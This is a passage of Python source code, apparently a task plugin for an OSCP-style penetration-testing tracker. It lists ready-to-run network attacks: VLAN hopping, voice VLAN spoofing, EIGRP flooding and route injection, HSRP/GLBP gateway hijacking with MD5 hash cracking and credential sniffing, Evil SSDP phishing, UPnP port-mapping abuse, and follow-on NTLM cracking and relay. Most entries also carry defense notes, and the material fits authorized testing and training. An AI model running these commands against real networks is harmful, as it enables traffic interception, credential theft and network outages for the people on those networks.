                    'Craft custom frames with Scapy for specific protocols',
                    'One-way attack: Can send TO target VLAN, cannot receive replies (asymmetric routing)'
                ],
                'alternatives': [
                    'Scapy manual: Ether(dst="...")/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst="10.10.20.24")/ICMP()',
                    'VLANPWN toolkit: git clone https://github.com/casterbytethrowback/VLANPWN',
                    'Manual frame crafting with hping3 or nemesis',
                    'yersinia 802.1Q attacks'
                ],
                'notes': 'REQUIRES: (1) Attacker on native VLAN, (2) Native VLAN untagged on trunk, (3) Target VLAN allowed on trunk. Attack is ONE-WAY (send only, no reply path). Defense: Tag native VLAN (vlan dot1q tag native) or use unused VLAN as native.'
            }
        })

        # Task 16: Voice VLAN hijacking (IP phone spoofing)
        vlan_hopping_tasks['children'].append({
            'id': f'voice-vlan-hijack-{port}',
            'name': 'Voice VLAN Hijacking (IP Phone Spoofing)',
            'type': 'command',
            'metadata': {
                'command': 'sudo voiphopper -i eth0 -f cisco-7940',
                'description': 'Spoof IP phone via CDP/LLDP to hop into voice VLAN',
                'tags': ['OSCP:HIGH', 'EXPLOIT', 'VLAN', 'VOIP'],
                'flag_explanations': {
                    '-i eth0': 'Network interface',
                    '-f cisco-7940': 'Fake phone model (CDP TLV impersonation)',
                    'voiphopper': 'VoIP VLAN hopping tool (Kali default)'
                },
                'success_indicators': [
                    '[+] Received CDP advertisement with voice VLAN',
                    '[+] Created sub-interface eth0.<VVID>',
                    '[+] DHCP lease obtained on voice VLAN',
                    'Voice VLAN ID discovered (VVID field in CDP/LLDP)'
                ],
                'failure_indicators': [
                    'No CDP/LLDP advertisements received',
                    'CDP/LLDP disabled on switch',
                    'Voice VLAN not configured',
                    'DHCP option 150 missing (no voice config)'
                ],
                'next_steps': [
                    'Access VoIP infrastructure: SIP servers, call managers',
                    'Enumerate VoIP devices: nmap -sV -p 5060,5061 <voice_vlan_subnet>',
                    'SIP enumeration: svmap <voice_vlan_subnet>',
                    'Eavesdrop on calls with Wireshark (RTP streams)',
                    'Pivot to management VLANs often accessible from voice VLAN'
                ],
                'alternatives': [
                    'Interactive mode: sudo voiphopper -i eth0 -z (auto-hop when VVID learned)',
                    'Manual CDP: Use yersinia to send CDP with voice VLAN request',
                    'LLDP-MED spoofing: lldpd with fake phone profile',
                    'Scapy CDP crafting: Send CDP with fake phone capabilities',
                    'Manual sub-interface: sudo ip link add link eth0 name eth0.<VVID> type vlan id <VVID>'
                ],
                'notes': 'Voice VLAN separation bypassed because switches trust CDP/LLDP from endpoint. Most corporate access ports configured for data+voice. DHCP option 150/66 reveals TFTP server. Voice VLAN often has relaxed ACLs for QoS. Defense: Disable LLDP-MED auto-policy or restrict to authenticated MAC OUIs.'
            }
        })

        # Task 17: Trunk mode reconfiguration (switch CLI access)
        vlan_hopping_tasks['children'].append({
            'id': f'trunk-reconfig-{port}',
            'name': 'Manual Trunk Reconfiguration (Switch Access)',
            'type': 'manual',
            'metadata': {
                'description': 'Reconfigure switch port to trunk mode for full VLAN access',
                'tags': ['OSCP:MEDIUM', 'MANUAL', 'VLAN', 'SWITCH'],
                'notes': '''PREREQUISITES: Authenticated switch CLI access (console/Telnet/SSH)

STEP 1: Identify connected port
- Via CDP: show cdp neighbors detail
- Via MAC: show mac address-table | include <MAC>
- Example output: Gi0/2 (current port)

STEP 2: List existing VLANs
Switch# show vlan brief
(Note VLAN IDs: 10, 20, 50, 60)

STEP 3: Reconfigure port to trunk
Switch(config)# interface GigabitEthernet 0/2
Switch(config-if)# switchport trunk encapsulation dot1q
Switch(config-if)# switchport mode trunk
Switch(config-if)# switchport trunk allowed vlan all
(Connection will drop temporarily)

STEP 4: Create VLAN sub-interfaces (Kali attacker box)
# Modern method (preferred)
sudo modprobe 8021q
sudo ip link add link eth0 name eth0.10 type vlan id 10
sudo ip link add link eth0 name eth0.20 type vlan id 20
sudo ip link add link eth0 name eth0.50 type vlan id 50
sudo ip link set eth0.10 up
sudo ip link set eth0.20 up
sudo ip link set eth0.50 up

# Legacy method (deprecated but still works)
sudo vconfig add eth0 10
sudo vconfig add eth0 20
sudo ifconfig eth0.10 up
sudo ifconfig eth0.20 up

STEP 5: Obtain IP addresses
# Dynamic (DHCP)
sudo dhclient -v eth0.10
sudo dhclient -v eth0.20

# Static (if DHCP fails)
sudo ip addr add 10.10.10.50/24 dev eth0.10
sudo ip addr add 10.10.20.50/24 dev eth0.20

STEP 6: Verify connectivity
ping -c 2 10.10.10.1     # VLAN 10 gateway
ping -c 2 10.10.20.1     # VLAN 20 gateway

RESULT: Full access to ALL VLANs from single port. Enumerate each VLAN independently.

DEFENSE:
- Disable unused ports
- Port security (sticky MAC addresses)
- 802.1X authentication
- Restrict console/vty access
- Log all config changes''',
                'alternatives': [
                    'DTP spoofing (no switch access needed): See previous tasks',
                    'VLAN hopping via native VLAN double-tagging',
                    'Physical access to multiple ports (bridge VLANs externally)'
                ]
            }
        })

        tasks['children'].append(vlan_hopping_tasks)

        # ========== PHASE 7: ROUTING PROTOCOL ATTACKS ==========
        routing_attacks = {
            'id': f'routing-attacks-{port}',
            'name': 'Routing Protocol Attacks (EIGRP/GLBP/HSRP)',
            'type': 'parent',
            'children': []
        }

        # Task 18: EIGRP hello flooding (DoS)
        routing_attacks['children'].append({
            'id': f'eigrp-hello-flood-{port}',
            'name': 'EIGRP Hello Flooding Attack (DoS)',
            'type': 'command',
            'metadata': {
                'command': 'sudo python3 helloflooding.py --interface eth0 --as 1 --subnet 10.10.100.0/24',
                'description': 'Flood routers with EIGRP hello packets to overload CPU',
                'tags': ['OSCP:LOW', 'EXPLOIT', 'DOS', 'ROUTING'],
                'flag_explanations': {
                    '--interface eth0': 'Network interface for packet injection',
                    '--as 1': 'EIGRP Autonomous System number (enumerate from captures)',
                    '--subnet 10.10.100.0/24': 'Target subnet where routers reside'
                },
                'success_indicators': [
                    'Router CPU spikes to 90%+',
                    'EIGRP adjacencies flapping',
                    'Routing instability observed',
                    'show processes cpu shows high EIGRP hello processing'
                ],
                'failure_indicators': [
                    'No EIGRP running on network',
                    'Routers ignore forged hello packets',
                    'EIGRP authentication enabled (MD5)',
                    'Rate limiting blocks flood'
                ],
                'next_steps': [
                    'Monitor router with: show processes cpu | include EIGRP',
                    'Check adjacencies: show ip eigrp neighbors',
                    'Combine with route injection for MITM',
                    'Use during exploitation window for distraction'
                ],
                'alternatives': [
                    'Scapy EIGRP hello crafting: Send custom EIGRP hello packets',
                    'Packet replay: Capture legitimate hello, replay at high rate',
                    'Tool source: https://github.com/Sab0tag3d/EIGRP-tools'
                ],
                'notes': 'DISRUPTIVE ATTACK - causes network instability. EIGRP uses multicast 224.0.0.10. Hello interval default 5 seconds, hold time 15 seconds. Modern routers may have rate limiting. OSCP:LOW relevance (less common in exams, more DoS than exploitation).'
            }
        })

        # Task 19: EIGRP route injection (blackhole)
        routing_attacks['children'].append({
            'id': f'eigrp-route-inject-{port}',
            'name': 'EIGRP Route Injection (Blackhole/MITM)',
            'type': 'command',
            'metadata': {
                'command': 'sudo python3 routeinject.py --interface eth0 --as 1 --src 10.10.100.50 --dst 172.16.100.0 --prefix 24',
                'description': 'Inject false EIGRP routes to redirect or drop traffic',
                'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'MITM', 'ROUTING'],
                'flag_explanations': {
                    '--interface eth0': 'Network interface for route advertisement',
                    '--as 1': 'EIGRP AS number (must match legitimate routers)',
                    '--src 10.10.100.50': 'Attacker IP (advertised as next-hop)',
                    '--dst 172.16.100.0': 'Target subnet to hijack',
                    '--prefix 24': 'Subnet mask (/24 = 255.255.255.0)'
                },
                'success_indicators': [
                    'Route appears in router table: show ip route eigrp',
                    'Traffic destined for target subnet routed to attacker',
                    'Traceroute shows attacker as hop',
                    'EIGRP neighbor adjacency established'
                ],
                'failure_indicators': [
                    'EIGRP authentication blocks injection',
                    'Route filtering prevents advertisement',
                    'Metric too high (legitimate route preferred)',
                    'No EIGRP adjacency formed'
                ],
                'next_steps': [
                    'MITM setup: Enable IP forwarding: sudo sysctl -w net.ipv4.ip_forward=1',
                    'NAT traffic: sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE',
                    'Intercept credentials: sudo tcpdump -i eth0 -w capture.pcap',
                    'Blackhole attack: Disable forwarding to drop all traffic',
                    'Verify injection: show ip route 172.16.100.0 on legitimate router'
                ],
                'alternatives': [
                    'FRRouting (legitimate router): Configure EIGRP on Linux box',
                    'Manual: routingtableoverflow.py for mass route injection (DoS)',
                    'Scapy: Craft EIGRP update packets with custom metrics',
                    'Passive monitoring: Identify EIGRP networks with Wireshark first'
                ],
                'notes': 'EIGRP metric calculation: Bandwidth + Delay (K-values). Lower metric = preferred route. Advertise 0.0.0.0/0 to become default gateway. Authentication (MD5) defeats injection. OSCP:MEDIUM - less common but powerful for internal pivoting.'
            }
        })

        # Task 20: GLBP AVG hijacking (MitM)
        routing_attacks['children'].append({
            'id': f'glbp-hijack-{port}',
            'name': 'GLBP AVG Hijacking (Gateway MitM)',
            'type': 'manual',
            'metadata': {
                'description': 'Hijack GLBP Active Virtual Gateway for traffic interception',
                'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'MITM', 'ROUTING'],
                'notes': '''GLBP (Gateway Load Balancing Protocol) - Cisco redundancy protocol using UDP 3222

RECONNAISSANCE (Wireshark):
- Capture GLBP hello packets (UDP 3222, multicast 224.0.0.102)
- Note: Virtual IP (default gateway), AS number, priority values, authentication
- Identify AVG (Active Virtual Gateway) and AVF (Active Virtual Forwarders)

ATTACK WORKFLOW (using Loki: https://github.com/raizo62/loki_on_kali):

1. Enable promiscuous mode and IP forwarding
   sudo ip link set eth0 promisc on
   sudo sysctl -w net.ipv4.ip_forward=1

2. Launch Loki and identify GLBP configuration
   sudo loki -i eth0
   (Select GLBP attack module, identify target router)

3. Inject GLBP packet with maximum priority (255) and weight (255)
   - This makes attacker the new AVG (primary router)
   - Attacker must respond to ARP for virtual MAC

4. Configure secondary IP matching GLBP virtual IP
   sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
   (10.10.100.254 = GLBP virtual IP from recon)

5. Generate Gratuitous ARP to announce takeover
   sudo arping -I eth0 -c 3 -s 10.10.100.254 10.10.100.254

6. Set up SNAT for complete traffic visibility
   sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

7. Route traffic back through legitimate AVG (prevent blackhole)
   sudo route del default
   sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
   (10.10.100.100 = original router IP)

RESULT: All client traffic flows through attacker box. Capture credentials:
sudo python2 net-creds.py -i eth0

DEFENSE:
- GLBP authentication (MD5)
- Port security (limit MAC addresses per port)
- Private VLANs
- Monitor for priority 255 packets (anomaly)

OSCP RELEVANCE: Medium - less common than HSRP but present in Cisco enterprise networks''',
                'alternatives': [
                    'Manual Scapy: Craft GLBP hello with priority=255',
                    'FRRouting: Run legitimate GLBP daemon on Linux',
                    'Passive sniffing: Monitor GLBP traffic without injection (stealthy recon)'
                ]
            }
        })

        # Task 21: HSRP hijacking (redundancy exploitation)
        routing_attacks['children'].append({
            'id': f'hsrp-hijack-{port}',
            'name': 'HSRP Active Router Hijacking',
            'type': 'manual',
            'metadata': {
                'description': 'Hijack HSRP Active Router role for gateway MITM',
                'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'MITM', 'ROUTING'],
                'notes': '''HSRP (Hot Standby Router Protocol) - Cisco gateway redundancy (UDP 1985)

RECON (Wireshark):
- Capture HSRP traffic (UDP 1985, multicast 224.0.0.2 for v1, 224.0.0.102 for v2)
- Note: Virtual IP, HSRP group number, priority, authentication
- HSRPv1: Groups 0-255, MAC 0000.0c07.acXX
- HSRPv2: Groups 0-4095, MAC 0000.0c9f.fXXX

BYPASSING AUTHENTICATION:
1. Capture HSRP traffic to .pcap
   sudo tcpdump -i eth0 udp port 1985 -w hsrp.pcap

2. Extract MD5 hashes with hsrp2john.py
   python2 /usr/share/john/hsrp2john.py hsrp.pcap > hsrp_hashes

3. Crack hashes with John
   john --wordlist=/usr/share/wordlists/rockyou.txt hsrp_hashes

ATTACK EXECUTION (using Loki):

1. Promiscuous mode + IP forwarding
   sudo ip link set eth0 promisc on
   sudo sysctl -w net.ipv4.ip_forward=1

2. Launch Loki and select HSRP attack
   sudo loki -i eth0
   (Input cracked HSRP password, set priority to 255)

3. Configure virtual IP on attacker interface
   sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0

4. Set up SNAT
   sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

5. Route through original Active Router
   sudo route del default
   sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100

6. Capture credentials
   sudo python2 net-creds.py -i eth0

MITM SUCCESS INDICATORS:
- HSRP state: Active (check via show standby on legitimate router)
- Client ARP tables show attacker MAC for default gateway
- Traffic captured in tcpdump

DEFENSE:
- HSRP authentication (MD5 with strong password)
- Port security
- Monitor HSRP state transitions (Event 107/108)
- Use routing protocols with auth (OSPF, EIGRP with MD5)

OSCP RELEVANCE: Medium - more common than GLBP, key for internal network pivoting''',
                'alternatives': [
                    'Scapy HSRP crafting: Send HSRP hello with priority=255',
                    'FRRouting: vrrpd (VRRP, similar to HSRP)',
                    'Passive monitoring: Identify standby routers for targeting',
                    'K-values abuse: relationshipnightmare.py for HSRP disruption'
                ]
            }
        })

        tasks['children'].append(routing_attacks)

        # ========== PHASE 8: SSDP/UPNP SPOOFING ==========
        ssdp_tasks = {
            'id': f'ssdp-upnp-{port}',
            'name': 'SSDP/UPnP Device Spoofing',
            'type': 'parent',
            'children': []
        }

        # Task 22: Evil SSDP phishing
        ssdp_tasks['children'].append({
            'id': f'evil-ssdp-{port}',
            'name': 'Evil SSDP: Fake Device Phishing',
            'type': 'command',
            'metadata': {
                'command': 'sudo python3 evil_ssdp.py eth0 -t office365',
                'description': 'Spoof UPnP/SSDP devices to capture credentials via phishing',
                'tags': ['OSCP:LOW', 'EXPLOIT', 'PHISHING', 'IOT'],
                'flag_explanations': {
                    'evil_ssdp.py': 'Tool for SSDP/UPnP device spoofing',
                    'eth0': 'Network interface to advertise fake devices',
                    '-t office365': 'Template (office365, scanner, password-vault, etc.)'
                },
                'success_indicators': [
                    '[+] SSDP server started on 0.0.0.0:1900',
                    '[+] HTTP server started on 0.0.0.0:8080',
                    'Fake device appears in Windows Network Explorer',
                    '[+] Credentials captured from victim'
                ],
                'failure_indicators': [
                    'UDP 1900 already in use (another SSDP service running)',
                    'No devices discovered by clients (SSDP disabled/filtered)',
                    'Clients ignore spoofed device',
                    'Template not convincing (wrong branding for environment)'
                ],
                'next_steps': [
                    'Customize templates: Edit HTML/CSS in evil_ssdp templates/',
                    'Capture creds: Check evil_ssdp logs for submitted credentials',
                    'Post-capture redirect: evil_ssdp.py -r https://legitimate-site.com',
                    'Try multiple templates: scanner (MFP), nas, media-server',
                    'Use captured creds for SMB/HTTP/LDAP authentication'
                ],
                'alternatives': [
                    'Manual SSDP: Craft NOTIFY messages with Scapy',
                    'Responder SSDP: Responder includes SSDP poisoning',
                    'UPnP tools: Miranda (discovery), Umap (exploit), upnp-arsenal toolkit',
                    'Evil Twin for WiFi: Similar concept for wireless networks'
                ],
                'notes': 'SSDP (UDP 1900) used for device discovery. UPnP often enabled on Windows by default. Fake devices appear in Network Explorer. Templates mimic: Office365 login, Scanner file destination, NAS login, Printer web interface. Users trust "local devices" and enter credentials. Tool: https://github.com/initstring/evil-ssdp. OSCP:LOW relevance (phishing, less technical than other attacks).'
            }
        })

        # Task 23: UPnP IGD exploitation
        ssdp_tasks['children'].append({
            'id': f'upnp-igd-{port}',
            'name': 'UPnP IGD Port Mapping Abuse',
            'type': 'manual',
            'metadata': {
                'description': 'Exploit UPnP Internet Gateway Device for port forwarding',
                'tags': ['OSCP:LOW', 'EXPLOIT', 'IOT', 'NETWORK'],
                'notes': '''UPnP IGD (Internet Gateway Device) allows internal clients to request port mappings on NAT gateway

RECON:
1. Discover UPnP devices
   sudo nmap -sU -p 1900 --script upnp-info <subnet>
   OR: miranda -d (interactive UPnP discovery)

2. Enumerate IGD services
   miranda -l <device_ip> (list services)
   Look for: WANIPConnection, WANPPPConnection (IGD control points)

3. Check exposed SOAP endpoints
   curl http://<router_ip>:<port>/igd.xml

EXPLOITATION:
1. Add port forwarding rule (attacker → internal host)
   miranda -a <device_ip> -p <external_port> -P <internal_port> -t <internal_ip>
   Example: Forward external 443 → internal RDP 3389

2. Access internal services from WAN
   Now external attackers can reach internal services

3. Enumerate existing mappings
   miranda -l <device_ip> -s WANIPConnection -a GetGenericPortMappingEntry

TOOLS:
- Miranda: UPnP SOAP interaction (apt install miranda-upnp)
- Umap: WAN-accessible UPnP command discovery
- upnp-arsenal: UPnP attack toolkit (https://github.com/0x90/upnp-arsenal)
- Metasploit: auxiliary/scanner/upnp/ssdp_msearch

DEFENSE:
- Disable UPnP on routers (WAN side especially)
- Firewall rules blocking UDP 1900 from untrusted networks
- Firmware updates (many UPnP vulnerabilities patched)
- Monitor for unexpected port mappings

OSCP RELEVANCE: Low - more IoT/home network than enterprise. Useful for internal pivoting if UPnP-enabled routers present.''',
                'alternatives': [
                    'Scapy SOAP: Craft AddPortMapping SOAP requests',
                    'curl SOAP: Manual SOAP envelope to IGD control URL',
                    'Metasploit: use auxiliary/admin/upnp/miranda'
                ]
            }
        })

        tasks['children'].append(ssdp_tasks)

        return tasks


    def on_task_complete(self, task_id: str, result: str, target: str) -> List[Dict[str, Any]]:
        """Parse results and spawn additional tasks"""
        new_tasks = []

        # If Responder captured hashes, add cracking task
        if 'responder' in task_id and ('NTLMv2' in result or 'NTLMv1' in result):
            new_tasks.append({
                'id': f'crack-ntlm-{task_id}',
                'name': 'Crack Captured NTLM Hashes',
                'type': 'command',
                'metadata': {
                    'command': 'hashcat -m 5600 /usr/share/responder/logs/*.txt /usr/share/wordlists/rockyou.txt',
                    'description': 'Crack captured NTLMv2 hashes with hashcat',
                    'tags': ['OSCP:HIGH', 'EXPLOIT'],
                    'notes': '-m 5600 for NTLMv2, -m 5500 for NTLMv1. Hashes in /usr/share/responder/logs/'
                }
            })

        # If SMB signing disabled found, add relay task
        if 'smb-signing' in task_id and 'not required' in result.lower():
            new_tasks.append({
                'id': f'relay-ready-{task_id}',
                'name': 'SMB Signing Disabled - Relay Attack Ready',
                'type': 'manual',
                'metadata': {
                    'description': 'Target has SMB signing disabled - perfect for NTLM relay',
                    'tags': ['OSCP:HIGH', 'EXPLOIT'],
                    'notes': 'Start ntlmrelayx and Responder in parallel. Relay will happen automatically.'
                }
            })

        return new_tasks
